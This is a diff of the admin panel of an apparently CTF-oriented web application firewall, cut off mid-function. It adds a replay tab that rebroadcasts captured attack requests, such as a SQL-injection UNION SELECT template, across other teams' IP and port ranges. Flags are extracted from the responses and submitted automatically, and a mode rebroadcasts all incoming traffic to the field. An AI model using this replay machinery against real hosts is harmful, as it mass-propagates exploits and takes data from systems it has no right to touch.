+<!-- /flagsub -->
 
 <!-- REPLAY TAB -->
 <div id="tab-replay" class="tab-panel">
-<div class="sec"><div class="sec-title">流量重放 / 广播攻击</div>
-<div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.8">
-将捕获的攻击流量重放到其他队伍的靶机，自动获取 flag。<br>
-<span style="color:#fbbf24">工作流程：</span>从攻击日志中选择一条请求 → 修改目标 IP 范围 → 广播发送 → 自动提取 flag → 提交到平台<br>
-<span style="color:var(--text2);font-size:11px">注意：请确保自动提交 Flag 已配置并开启。</span>
-</div>
-
-<div class="sec" style="border:1px solid var(--border)">
-<div class="sec-title">手动重放</div>
-<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
-  <div>
-    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">HTTP 请求模板</div>
-    <textarea id="replay-raw" rows="12" placeholder="GET /vuln.php?id=1+UNION+SELECT+1,2,3-- HTTP/1.1&#10;Host: {target}&#10;User-Agent: Mozilla/5.0&#10;&#10;"></textarea>
-    <div style="color:var(--text2);font-size:10px;margin-top:4px">使用 <code style="color:#f97316">{target}</code> 作为目标主机占位符</div>
+  <div class="sec">
+    <div class="sec-title">流量重放 / 广播攻击</div>
+    <div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.8">
+      将捕获的攻击流量重放到其他队伍的靶机，自动获取 flag。<br>
+      <span style="color:#fbbf24">工作流程：</span>从攻击日志中选择一条请求 → 修改目标 IP 范围 → 广播发送 → 自动提取 flag → 提交到平台<br>
+      <span style="color:var(--text2);font-size:11px">注意：请确保自动提交 Flag 已配置并开启。</span>
+    </div>
+  </div> <div class="sec" style="border:1px solid var(--border)">
+    <div class="sec-title">手动重放</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px">
+      <div>
+        <div style="color:var(--text2);font-size:11px;margin-bottom:6px">HTTP 请求模板</div>
+        <textarea id="replay-raw" rows="12" placeholder="GET /vuln.php?id=1+UNION+SELECT+1,2,3-- HTTP/1.1&#10;Host: {target}&#10;User-Agent: Mozilla/5.0&#10;&#10;"></textarea>
+        <div style="color:var(--text2);font-size:10px;margin-top:4px">使用 <code style="color:#f97316">{target}</code> 作为目标主机占位符</div>
+      </div>
+      <div>
+        <div style="color:var(--text2);font-size:11px;margin-bottom:6px">目标 IP 与 端口范围</div>
+        <div style="margin-bottom:8px">
+          <input type="text" id="replay-ip-start" placeholder="192.168.1.1" style="width:120px"> —
+          <input type="text" id="replay-ip-end" placeholder="192.168.1.20" style="width:120px">
+        </div>
+        <div style="margin-bottom:8px">
+          <span style="color:var(--text2);font-size:11px;margin-right:6px">端口:</span>
+          <input type="text" id="replay-port-start" placeholder="80" style="width:60px" value="80"> —
+          <input type="text" id="replay-port-end" placeholder="80" style="width:60px" value="80">
+        </div>
+        <div style="margin-bottom:8px">
+          <div style="color:var(--text2);font-size:10px;margin-bottom:4px">跳过自身 IP</div>
+          <label style="font-size:12px;display:flex;align-items:center;gap:6px">
+            <input type="checkbox" id="replay-skip-self" checked> 跳过 <?= $e($ip) ?>
+          </label>
+        </div>
+        <div style="margin-bottom:8px">
+          <div style="color:var(--text2);font-size:10px;margin-bottom:4px">Flag 提取正则</div>
+          <input type="text" id="replay-flag-regex" value="flag\{[A-Za-z0-9_\-]{1,100}\}" style="width:100%">
+        </div>
+        <div style="margin-bottom:12px">
+          <button type="button" class="btn bo" onclick="pwafReplayBroadcast()" id="replay-btn">&#x25B6; 开始广播</button>
+          <button type="button" class="btn bs" onclick="pwafReplayStop()" id="replay-stop-btn" style="display:none">&#x25A0; 停止</button>
+          <span id="replay-status" style="color:var(--text2);font-size:11px;margin-left:10px"></span>
+        </div>
+        <div style="color:var(--text2);font-size:10px">
+          结果：<span id="replay-sent" style="color:var(--cyan)">0</span> 发送 /
+          <span id="replay-flags" style="color:var(--green)">0</span> 提取到 flag /
+          <span id="replay-errors" style="color:var(--red)">0</span> 失败
+        </div>
+      </div>
+    </div>
   </div>
-  <div>
-    <div style="color:var(--text2);font-size:11px;margin-bottom:6px">目标 IP 范围</div>
-    <div style="margin-bottom:8px">
-      <input type="text" id="replay-ip-start" placeholder="192.168.1.1" style="width:140px"> —
-      <input type="text" id="replay-ip-end" placeholder="192.168.1.254" style="width:140px">
-      : <input type="text" id="replay-port" placeholder="80" style="width:60px" value="80">
+
+  <div class="sec" style="border:1px solid var(--border)">
+    <div class="sec-title" style="color:var(--green)">提取到的 Flag</div>
+    <div id="replay-flag-list" style="max-height:200px;overflow-y:auto;font-size:12px;color:var(--green)">
+      <div style="color:var(--text2);font-size:11px">广播完成后，提取到的 flag 会显示在这里</div>
     </div>
-    <div style="margin-bottom:8px">
-      <div style="color:var(--text2);font-size:10px;margin-bottom:4px">跳过自身 IP</div>
-      <label style="font-size:12px;display:flex;align-items:center;gap:6px">
-        <input type="checkbox" id="replay-skip-self" checked> 跳过 <?= $e($ip) ?>
-      </label>
-    </div>
-    <div style="margin-bottom:8px">
-      <div style="color:var(--text2);font-size:10px;margin-bottom:4px">Flag 提取正则</div>
-      <input type="text" id="replay-flag-regex" value="flag\{[A-Za-z0-9_\-]{1,100}\}" style="width:100%">
-    </div>
-    <div style="margin-bottom:12px">
-      <button type="button" class="btn bo" onclick="pwafReplayBroadcast()" id="replay-btn">&#x25B6; 开始广播</button>
-      <button type="button" class="btn bs" onclick="pwafReplayStop()" id="replay-stop-btn" style="display:none">&#x25A0; 停止</button>
-      <span id="replay-status" style="color:var(--text2);font-size:11px;margin-left:10px"></span>
-    </div>
-    <div style="color:var(--text2);font-size:10px">
-      结果：<span id="replay-sent" style="color:var(--cyan)">0</span> 发送 /
-      <span id="replay-flags" style="color:var(--green)">0</span> 提取到 flag /
-      <span id="replay-errors" style="color:var(--red)">0</span> 失败
+  </div>
+
+  <div class="sec" style="border:1px solid var(--border)">
+    <div class="sec-title">从攻击日志加载（点击加载到模板）</div>
+    <div style="max-height:250px;overflow-y:auto">
+      <table id="replay-log-table">
+        <tr><th>时间</th><th>规则</th><th>方法</th><th>URI</th><th>Payload</th><th>操作</th></tr>
+        <?php foreach (array_slice($stats['recent'], 0, 30) as $ev):
+            if (((isset($ev['action']) ? $ev['action'] : '')) !== 'block') continue;
+            $rmethod = (isset($ev['method']) ? $ev['method'] : 'GET');
+            $ruri = (isset($ev['uri']) ? $ev['uri'] : '/');
+            $rpost = (isset($ev['post']) ? $ev['post'] : '');
+            $replay_raw = $rmethod . ' ' . $ruri . " HTTP/1.1\nHost: {target}\nUser-Agent: " . ((isset($ev['ua']) ? $ev['ua'] : 'Mozilla/5.0'));
+            if ($rmethod === 'POST' && $rpost) {
+                $replay_raw .= "\nContent-Type: application/x-www-form-urlencoded\n\n" . $rpost;
+            }
+        ?>
+        <tr>
+          <td style="white-space:nowrap"><?= date('H:i:s', (isset($ev['ts']) ? $ev['ts'] : 0)) ?></td>
+          <td><span class="b b-<?= $e(isset($ev['rule']) ? $ev['rule'] : '') ?>"><?= $e((isset($ev['rule']) ? $ev['rule'] : '')) ?></span></td>
+          <td><?= $e($rmethod) ?></td>
+          <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?= $e($ruri) ?>"><?= $e($ruri) ?></td>
+          <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fbbf24" title="<?= $e(isset($ev['payload']) ? $ev['payload'] : '') ?>"><?= $e(substr((isset($ev['payload']) ? $ev['payload'] : ''),0,40)) ?></td>
+          <td><button type="button" class="btn bs" style="padding:2px 6px;font-size:10px" onclick="pwafLoadReplay(this)" data-raw="<?= $e(base64_encode($replay_raw)) ?>">加载</button></td>
+        </tr>
+        <?php endforeach; ?>
+      </table>
     </div>
   </div>
 </div>
-</div>
+<div id="tab-autoreap" class="tab-panel">
+  <div class="sec">
+    <div class="sec-title">全流量审计与盲打收割</div>
+    <div style="color:var(--text2);font-size:12px;margin-bottom:14px;line-height:1.8">
+      此处实时监控到达本服务器的<b>所有 HTTP 请求</b>（包含被拦截的攻击与放行的正常流量）。点击<code style="color:var(--accent);">详情</code>可查看完整请求报文。<br>
+      
+      <details style="background:#060a14;border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-top:8px;outline:none;">
+        <summary style="cursor:pointer;color:#f97316;font-weight:bold;outline:none;user-select:none;">&#x25B6; 展开高级功能：全流量自动盲打收割 (躺平模式)</summary>
+        <div style="margin-top:12px;display:grid;grid-template-columns:1fr 1fr;gap:20px;border-top:1px dashed var(--border);padding-top:12px;">
+          <div>
+            <div style="color:var(--text2);font-size:11px;margin-bottom:6px">盲打目标 IP 与端口范围</div>
+            <div style="margin-bottom:8px">
+              <input type="text" id="auto-ip-start" placeholder="192.168.1.1" style="width:130px"> — 
+              <input type="text" id="auto-ip-end" placeholder="192.168.1.20" style="width:130px">
+            </div>
+            <div style="margin-bottom:8px">
+              <span style="color:var(--text2);font-size:11px;margin-right:6px">端口:</span>
+              <input type="text" id="auto-port-start" placeholder="80" style="width:60px" value="80"> — 
+              <input type="text" id="auto-port-end" placeholder="80" style="width:60px" value="80">
+            </div>
+            <div style="color:var(--text2);font-size:10px;line-height:1.5;">
+              <span style="color:#f87171">警告：开启此功能会将本机收到的所有流量广播给全场。</span><br>
+              若目标机器吐出 Flag，系统将调用“自动提交 Flag”模块的配置进行静默提交。
+            </div>
+          </div>
+          <div style="display:flex;flex-direction:column;justify-content:center">
+            <div style="margin-bottom:12px">
+              <label class="toggle-switch" style="vertical-align:middle;margin-right:10px">
+                <input type="checkbox" id="auto-reap-toggle" onchange="toggleAutoReap(this)">
+                <span class="toggle-slider"></span>
+              </label>
+              <span id="auto-reap-status" style="font-weight:bold;color:var(--text2)">自动盲打: 关闭</span>
+            </div>
+            <div style="color:var(--text2);font-size:10px;line-height:1.8;background:#0a0e1a;padding:8px;border-radius:4px;">
+              待处理队列: <span id="auto-queue-count" style="color:var(--cyan);font-weight:bold;">0</span><br>
+              已广播请求: <span id="auto-sent-count" style="color:var(--accent);font-weight:bold;">0</span><br>
+              捕获并提交 Flag: <span id="auto-flag-count" style="color:var(--green);font-weight:bold;">0</span>
+            </div>
+          </div>
+        </div>
+      </details>
+    </div>
 
-<div class="sec" style="border:1px solid var(--border)">
-<div class="sec-title" style="color:var(--green)">提取到的 Flag</div>
-<div id="replay-flag-list" style="max-height:200px;overflow-y:auto;font-size:12px;color:var(--green)">
-<div style="color:var(--text2);font-size:11px">广播完成后，提取到的 flag 会显示在这里</div>
-</div>
-</div>
+    <div style="border:1px solid var(--border);border-radius:6px;background:#0a0e1a;">
+      <div style="padding:10px 16px;border-bottom:1px solid var(--border);display:flex;gap:20px;align-items:center;background:#0f1629;border-radius:6px 6px 0 0;">
+        <span style="color:var(--text2);font-size:11px;font-weight:bold;">视图过滤:</span>
+        <label style="font-size:11px;display:flex;align-items:center;gap:6px;cursor:pointer;color:var(--text);">
+          <input type="checkbox" id="filter-self-ip" checked> 隐藏本机/管理员 IP
+        </label>
+        <label style="font-size:11px;display:flex;align-items:center;gap:6px;cursor:pointer;color:var(--text);">
+          <input type="checkbox" id="filter-ajax" checked> 隐藏 WAF 面板通讯
+        </label>
+      </div>
 
-<div class="sec" style="border:1px solid var(--border)">
-<div class="sec-title">从攻击日志加载（点击加载到模板）</div>
-<div style="max-height:250px;overflow-y:auto">
-<table id="replay-log-table">
-<tr><th>时间</th><th>规则</th><th>方法</th><th>URI</th><th>Payload</th><th>操作</th></tr>
-<?php foreach (array_slice($stats['recent'], 0, 30) as $ev):
-    if (((isset($ev['action']) ? $ev['action'] : '')) !== 'block') continue;
-    $rmethod = (isset($ev['method']) ? $ev['method'] : 'GET');
-    $ruri = (isset($ev['uri']) ? $ev['uri'] : '/');
-    $rpost = (isset($ev['post']) ? $ev['post'] : '');
-    $replay_raw = $rmethod . ' ' . $ruri . " HTTP/1.1\nHost: {target}\nUser-Agent: " . ((isset($ev['ua']) ? $ev['ua'] : 'Mozilla/5.0'));
-    if ($rmethod === 'POST' && $rpost) {
-        $replay_raw .= "\nContent-Type: application/x-www-form-urlencoded\n\n" . $rpost;
-    }
-?>
-<tr>
-  <td style="white-space:nowrap"><?= date('H:i:s', (isset($ev['ts']) ? $ev['ts'] : 0)) ?></td>
-  <td><span class="b b-<?= $e(isset($ev['rule']) ? $ev['rule'] : '') ?>"><?= $e((isset($ev['rule']) ? $ev['rule'] : '')) ?></span></td>
-  <td><?= $e($rmethod) ?></td>
-  <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?= $e($ruri) ?>"><?= $e($ruri) ?></td>
-  <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fbbf24" title="<?= $e(isset($ev['payload']) ? $ev['payload'] : '') ?>"><?= $e(substr((isset($ev['payload']) ? $ev['payload'] : ''),0,40)) ?></td>
-  <td><button type="button" class="btn bs" style="padding:2px 6px;font-size:10px" onclick="pwafLoadReplay(this)" data-raw="<?= $e(base64_encode($replay_raw)) ?>">加载</button></td>
-</tr>
-<?php endforeach; ?>
-</table>
+      <table id="full-traffic-table" style="table-layout:fixed;width:100%;">
+
+        <tr>
+          <th style="width:70px">时间</th>
+          <th style="width:60px">状态</th>
+          <th style="width:110px">源 IP</th>
+          <th style="width:60px">方法</th>
+          <th>URI</th>
+          <th style="width:70px;text-align:center;">操作</th>
+        </tr>
+      </table>
+    </div>
+  </div>
 </div>
-</div>
-</div><!-- /replay -->
 
 </div><!-- /main -->
 </div><!-- /layout -->
 <script>
-function showTab(id,el){
-  document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active')});
-  document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});
-  document.getElementById('tab-'+id).classList.add('active');
-  el.classList.add('active');
+// function showTab(id,el){
+//   document.querySelectorAll('.tab-panel').forEach(function(p){p.classList.remove('active')});
+//   document.querySelectorAll('.nav-item').forEach(function(n){n.classList.remove('active')});
+//   document.getElementById('tab-'+id).classList.add('active');
+//   el.classList.add('active');
+// }
+// ── 核心 UI 状态管理 (Tab 与滚动) ───────────────────────────────────────────
+function showTab(id, el) {
+  document.querySelectorAll('.tab-panel').forEach(function(p){ p.classList.remove('active'); });
+  document.querySelectorAll('.nav-item').forEach(function(n){ n.classList.remove('active'); });
+  
+  var targetPanel = document.getElementById('tab-' + id);
+  if (targetPanel) targetPanel.classList.add('active');
+  
+  if (el) {
+    el.classList.add('active');
+  } else {
+    document.querySelectorAll('.nav-item').forEach(function(n) {
+      if (n.getAttribute('onclick') && n.getAttribute('onclick').includes("'" + id + "'")) {
+        n.classList.add('active');
+      }
+    });
+  }
+  localStorage.setItem('pwaf_active_tab', id);
 }
+
+document.addEventListener('DOMContentLoaded', function() {
+  // 1. 无缝恢复 Tab 和滚动条
+  var activeTab = localStorage.getItem('pwaf_active_tab');
+  if (activeTab && document.getElementById('tab-' + activeTab)) {
+    showTab(activeTab, null);
+  }
+  var scrollPos = localStorage.getItem('pwaf_scroll_pos');
+  var mainEl = document.querySelector('.main');
+  if (scrollPos && mainEl) {
+    mainEl.scrollTop = parseInt(scrollPos);
+  }
+
+  // 2. 表单全局 AJAX 劫持 (彻底消除提交引起的页面刷新与 Tab 丢失)
+  document.querySelectorAll('form').forEach(function(form) {
+    var actInput = form.querySelector('input[name="act"]');
+    if (!actInput) return;
+    
+    var act = actInput.value;
+    var isConfigForm = ['save_forward', 'save_flagsub', 'fake_flag', 'save_openbasedir'].includes(act);
+    var isRuleToggle = ['toggle_rule', 'toggle_custom_rule'].includes(act);
+    
+    if (isConfigForm || isRuleToggle) {
+      // 抹除原本 HTML 中可能残余的内联提交，统一由事件驱动
+      var checkbox = form.querySelector('input[type="checkbox"]');
+      if (isRuleToggle && checkbox) {
+        checkbox.removeAttribute('onchange');
+        checkbox.addEventListener('change', function() {
+          form.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
+        });
+      }
+
+      form.addEventListener('submit', function(e) {
+        e.preventDefault(); // 核心：拦截原生 POST 跳转
+        var formData = new FormData(this);
+        
+        fetch(this.action, {
+          method: 'POST',
+          body: formData,
+          headers: { 'X-Requested-With': 'XMLHttpRequest' }
+        }).then(function(res) {
+          if (res.ok) {
+            showToast('[保存成功]', '后端配置已更新生效', false);
+            // UI 联动：自动更新旁边的 (当前：开启/关闭) 文本，消除错觉
+            if (act === 'save_forward' || act === 'save_flagsub') {
+              var isEnabled = formData.get(act === 'save_forward' ? 'forward_enabled' : 'flagsub_enabled') === '1';
+              var statusSpan = form.querySelector('.status-text');
+              if (statusSpan) {
+                statusSpan.innerHTML = '（当前：' + (isEnabled ? '<span style="color:var(--green)">开启</span>' : '<span style="color:var(--red)">关闭</span>') + '）';
+              }
+            }
+          } else {
+            showToast('[保存失败]', '服务器响应异常', true);
+            if (isRuleToggle && checkbox) checkbox.checked = !checkbox.checked; // 失败则回退UI
+          }
+        }).catch(function() {
+          showToast('[网络异常]', '无法连接到 WAF 服务', true);
+          if (isRuleToggle && checkbox) checkbox.checked = !checkbox.checked;
+        });
+      });
+    }
+  });
+
+  // 3. 流量转发与自动提交的开关，实现“即点即存”
+  document.querySelectorAll('input[name="forward_enabled"], input[name="flagsub_enabled"]').forEach(function(toggle) {
+    toggle.addEventListener('change', function() {
+      this.closest('form').dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
+    });
+  });
+});
+
+window.addEventListener('beforeunload', function() {
+  var mainArea = document.querySelector('.main');
+  if (mainArea) localStorage.setItem('pwaf_scroll_pos', mainArea.scrollTop);
+});
+
+// UI 辅助
 function filterLogs(q){
   q=q.toLowerCase();
   var rows=document.querySelectorAll('#log-table tr');
-  for(var i=1;i<rows.length;i++){
-    rows[i].style.display=rows[i].textContent.toLowerCase().indexOf(q)>-1?'':'none';
-  }
+  for(var i=1;i<rows.length;i++){ rows[i].style.display=rows[i].textContent.toLowerCase().indexOf(q)>-1?'':'none'; }
 }
 function toggleDetail(id){
   var el=document.getElementById(id);
+  if(!el) return;
   var btn=el.previousElementSibling.querySelector('.rule-expand-btn');
   if(el.classList.contains('open')){el.classList.remove('open');if(btn)btn.textContent='▸ 详情';}
   else{el.classList.add('open');if(btn)btn.textContent='▾ 收起';}
 }
+function toggleTrafficDetail(id) {
+  var el = document.getElementById('req-detail-' + id);
+  if (el) el.style.display = el.style.display === 'none' ? 'table-row' : 'none';
+}
 
-// ── 浏览器通知 + 自动刷新 ──────────────────────────────────────────────────
+// ── 音效与通知引擎 ──────────────────────────────────────────────────────────
 var _pwaf_last_count = <?= $stats['total'] ?>;
 var _pwaf_notify_perm = false;
 
-// 请求通知权限
 if ('Notification' in window) {
   if (Notification.permission === 'granted') { _pwaf_notify_perm = true; }
   else if (Notification.permission !== 'denied') {
@@ -2466,65 +2799,106 @@ if ('Notification' in window) {
   }
 }
 
+var style = document.createElement('style');
+style.innerHTML = '@keyframes toastIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } } @keyframes toastOut { from { transform: translateX(0); opacity: 1; } to { transform: translateX(100%); opacity: 0; } }';
+document.head.appendChild(style);
+
+function playAlertSound(isUrgent) {
+  try {
+    var ctx = new (window.AudioContext || window.webkitAudioContext)();
+    var osc = ctx.createOscillator(); var gain = ctx.createGain();
+    osc.connect(gain); gain.connect(ctx.destination);
+    osc.type = isUrgent ? 'sawtooth' : 'square';
+    osc.frequency.value = isUrgent ? 880 : 600;
+    gain.gain.setValueAtTime(0.05, ctx.currentTime);
+    osc.start(ctx.currentTime); osc.stop(ctx.currentTime + 0.15);
+    if (isUrgent) {
+      var osc2 = ctx.createOscillator(); var gain2 = ctx.createGain();
+      osc2.connect(gain2); gain2.connect(ctx.destination);
+      osc2.type = 'sawtooth'; osc2.frequency.value = 880;
+      gain2.gain.setValueAtTime(0.05, ctx.currentTime + 0.2);
+      osc2.start(ctx.currentTime + 0.2); osc2.stop(ctx.currentTime + 0.35);
+    }
+  } catch(e) {}
+}
+
+function showToast(title, msg, isUrgent) {
+  var t = document.createElement('div');
+  var bgColor = isUrgent ? '#7f1d1d' : '#0f1629';
+  var bdColor = isUrgent ? '#dc2626' : '#1e2d4a';
+  var titleColor = isUrgent ? '#fca5a5' : '#f97316';
+  t.style.cssText = 'position:fixed;bottom:24px;right:24px;background:' + bgColor + ';border:1px solid ' + bdColor + ';color:#c9d1e0;padding:16px 20px;border-radius:8px;z-index:9999;box-shadow:0 4px 20px rgba(0,0,0,0.5);font-family:Consolas,monospace;animation:toastIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;min-width:280px;';
+  t.innerHTML = '<div style="font-weight:bold;font-size:14px;margin-bottom:6px;color:' + titleColor + '">' + title + '</div><div style="font-size:12px;word-break:break-all;line-height:1.6;">' + msg + '</div>';
+  document.body.appendChild(t);
+  setTimeout(function() {
+    t.style.animation = 'toastOut 0.3s ease-in forwards';
+    setTimeout(function(){ t.remove(); }, 300);
+  }, 4000);
+}
+
 function pwafNotify(title, body, tag) {
   if (!_pwaf_notify_perm) return;
   try {
-    var n = new Notification(title, {
-      body: body,
-      icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🧨</text></svg>',
-      tag: tag || 'pwaf-' + Date.now(),
-      requireInteraction: false
-    });
+    var n = new Notification(title, { body: body, tag: tag || 'pwaf-' + Date.now(), requireInteraction: false });
     setTimeout(function() { n.close(); }, 8000);
   } catch(e) {}
 }
 
-// 每 3 秒轮询检查新事件
+// ── 基础拦截监控 (_poll) ──────────────────────────────────────────────────
 setInterval(function() {
-  fetch(window.location.href + '&_poll=1&_ts=' + Date.now(), {credentials: 'same-origin'})
+  fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_poll=1', {credentials: 'same-origin'})
     .then(function(r) { return r.json(); })
     .then(function(d) {
       if (!d || !d.total) return;
       if (d.total > _pwaf_last_count) {
-        var diff = d.total - _pwaf_last_count;
         _pwaf_last_count = d.total;
-        // 更新拦截总数显示
         var cards = document.querySelectorAll('.stat-val.orange');
         if (cards.length) cards[0].textContent = d.total.toLocaleString();
-        // 浏览器通知
+        
         if (d.latest_rule) {
           var urgentRules = ['cmdi','code','upload','flag_leak','flag_leak_b64','flag_leak_hex'];
           var isUrgent = urgentRules.indexOf(d.latest_rule) > -1;
-          pwafNotify(
-            isUrgent ? '⚠️ 高危攻击拦截!' : '🛡️ 攻击已拦截',
-            d.latest_rule.toUpperCase() + ' | ' + (d.latest_ip||'?') + ' | ' + (d.latest_uri||'').substring(0,60),
-            'pwaf-attack'
-          );
+          var title = isUrgent ? '[高危拦截] ' + d.latest_rule.toUpperCase() : '[攻击拦截] ' + d.latest_rule.toUpperCase();
+          var detail = '来源: ' + (d.latest_ip||'未知') + '<br>目标: ' + (d.latest_uri||'').substring(0,60);
+          playAlertSound(isUrgent); showToast(title, detail, isUrgent); pwafNotify(title, detail.replace(/<br>/g, ' | '), 'pwaf-attack');
+        }
+
+        if (d.recent_blocks) {
+          var replayTable = document.getElementById('replay-log-table');
+          if (replayTable) {
+            var esc = function(s) { return String(s||'').replace(/[&<>'"]/g, function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;',"'":'&#39;','"':'&quot;'}[c]; }); };
+            var html = '<tbody><tr><th>时间</th><th>规则</th><th>方法</th><th>URI</th><th>Payload</th><th>操作</th></tr>';
+            d.recent_blocks.forEach(function(ev) {
+              var rmethod = ev.method || 'GET'; var ruri = ev.uri || '/'; var rpost = ev.post || '';
+              var raw = rmethod + ' ' + ruri + " HTTP/1.1\nHost: {target}\nUser-Agent: " + (ev.ua || 'Mozilla/5.0');
+              if (rmethod === 'POST' && rpost) raw += "\nContent-Type: application/x-www-form-urlencoded\n\n" + rpost;
+              var b64raw = btoa(unescape(encodeURIComponent(raw))); 
+              var ts = new Date((ev.ts || 0) * 1000);
+              var timeStr = String(ts.getHours()).padStart(2,'0') + ':' + String(ts.getMinutes()).padStart(2,'0') + ':' + String(ts.getSeconds()).padStart(2,'0');
+              var shortPayload = (ev.payload || '').length > 40 ? ev.payload.substring(0, 40) : ev.payload;
+              html += '<tr><td style="white-space:nowrap">' + timeStr + '</td><td><span class="b b-' + esc(ev.rule) + '">' + esc(ev.rule) + '</span></td><td>' + esc(rmethod) + '</td><td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="' + esc(ruri) + '">' + esc(ruri) + '</td><td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#fbbf24" title="' + esc(ev.payload) + '">' + esc(shortPayload) + '</td><td><button type="button" class="btn bs" style="padding:2px 6px;font-size:10px" onclick="pwafLoadReplay(this)" data-raw="' + b64raw + '">加载</button></td></tr>';
+            });
+            html += '</tbody>'; replayTable.innerHTML = html;
+          }
+        }
+        var currentTab = localStorage.getItem('pwaf_active_tab') || 'dashboard';
+        if (currentTab === 'dashboard' || currentTab === 'logs') {
+          setTimeout(function() { window.location.reload(); }, 1500);
         }
       }
-    })
-    .catch(function(){});
+    }).catch(function(){});
 }, 3000);
 
-// ── 流量重放 JavaScript ─────────────────────────────────────────────────────
-var _replay_running = false;
-var _replay_stop = false;
+// ── 流量重放引擎 (Replay) ──────────────────────────────────────────────────
+function ip2long(ip) { var parts = ip.split('.'); if (parts.length !== 4) return 0; return ((parseInt(parts[0])<<24) + (parseInt(parts[1])<<16) + (parseInt(parts[2])<<8) + parseInt(parts[3])) >>> 0; }
+function long2ip(l) { return [(l>>>24)&255, (l>>>16)&255, (l>>>8)&255, l&255].join('.'); }
 
+var _replay_running = false; var _replay_stop = false;
 function pwafLoadReplay(btn) {
   var raw = atob(btn.getAttribute('data-raw'));
   document.getElementById('replay-raw').value = raw;
-  showTab('replay', document.querySelectorAll('.nav-item')[7]); // switch to replay tab
+  showTab('replay', null);
 }
-
-function ip2long(ip) {
-  var parts = ip.split('.');
-  if (parts.length !== 4) return 0;
-  return ((parseInt(parts[0])<<24) + (parseInt(parts[1])<<16) + (parseInt(parts[2])<<8) + parseInt(parts[3])) >>> 0;
-}
-function long2ip(l) {
-  return [(l>>>24)&255, (l>>>16)&255, (l>>>8)&255, l&255].join('.');
-}
-
 function pwafReplayStop() {
   _replay_stop = true;
   document.getElementById('replay-status').textContent = '已停止';
@@ -2538,14 +2912,16 @@ async function pwafReplayBroadcast() {
   if (!raw) { alert('请输入 HTTP 请求模板'); return; }
   var ipStart = document.getElementById('replay-ip-start').value.trim();
   var ipEnd = document.getElementById('replay-ip-end').value.trim();
-  var port = parseInt(document.getElementById('replay-port').value) || 80;
+  var pStart = parseInt(document.getElementById('replay-port-start').value) || 80;
+  var pEnd = parseInt(document.getElementById('replay-port-end').value) || pStart;
   var skipSelf = document.getElementById('replay-skip-self').checked;
   var flagRegex = document.getElementById('replay-flag-regex').value.trim();
   if (!ipStart || !ipEnd) { alert('请输入 IP 范围'); return; }
 
   var startL = ip2long(ipStart), endL = ip2long(ipEnd);
   if (startL > endL) { var tmp = startL; startL = endL; endL = tmp; }
-  var total = endL - startL + 1;
+  if (pStart > pEnd) { var tmpP = pStart; pStart = pEnd; pEnd = tmpP; }
+  var total = (endL - startL + 1) * (pEnd - pStart + 1);
 
   _replay_running = true; _replay_stop = false;
   document.getElementById('replay-btn').style.display = 'none';
@@ -2553,55 +2929,180 @@ async function pwafReplayBroadcast() {
   document.getElementById('replay-flag-list').innerHTML = '';
 
   var sent = 0, flags = 0, errors = 0;
-  var myIp = <?= json_encode($ip) ?>;
-  var flagRe;
-  try { flagRe = new RegExp(flagRegex, 'g'); } catch(e) { flagRe = /flag\{[A-Za-z0-9_\-]{1,100}\}/g; }
+  var myIp = "<?= $ip ?>";
+  var flagRe; try { flagRe = new RegExp(flagRegex, 'g'); } catch(e) { flagRe = /flag\{[A-Za-z0-9_\-\.!@#$%^&*()+=]{1,100}\}/g; }
 
   for (var i = startL; i <= endL && !_replay_stop; i++) {
     var targetIp = long2ip(i);
     if (skipSelf && targetIp === myIp) continue;
-
-    document.getElementById('replay-status').textContent = '发送中: ' + targetIp + ' (' + (sent+1) + '/' + total + ')';
-
-    try {
-      // 通过后端代理发送请求
-      var resp = await fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_replay=1', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'target_ip=' + encodeURIComponent(targetIp) + '&target_port=' + port + '&raw_request=' + encodeURIComponent(raw),
-        credentials: 'same-origin'
-      });
-      var result = await resp.json();
-      sent++;
-      if (result.body) {
-        var matches = result.body.match(flagRe);
-        if (matches) {
-          matches.forEach(function(f) {
-            flags++;
-            var div = document.createElement('div');
-            div.style.cssText = 'padding:4px 8px;border-bottom:1px solid var(--border)';
-            div.innerHTML = '<span style="color:var(--green)">' + f + '</span> <span style="color:var(--text2);font-size:10px">← ' + targetIp + '</span>';
-            document.getElementById('replay-flag-list').appendChild(div);
-          });
+    for (var p = pStart; p <= pEnd && !_replay_stop; p++) {
+      document.getElementById('replay-status').textContent = '发送中: ' + targetIp + ':' + p + ' (' + (sent+1) + '/' + total + ')';
+      try {
+        var resp = await fetch(window.location.href.split('?')[0] + '?waf_key=<?= urlencode($key) ?>&_replay=1', {
+          method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+          body: 'target_ip=' + encodeURIComponent(targetIp) + '&target_port=' + p + '&raw_request=' + encodeURIComponent(raw),
+          credentials: 'same-origin'
+        });
+        var result = await resp.json();
+        sent++;
+        if (result.body) {
+          var matches = result.body.match(flagRe);
+          if (matches) {
+            matches.forEach(function(f) {
+              flags++;
+              var div = document.createElement('div');
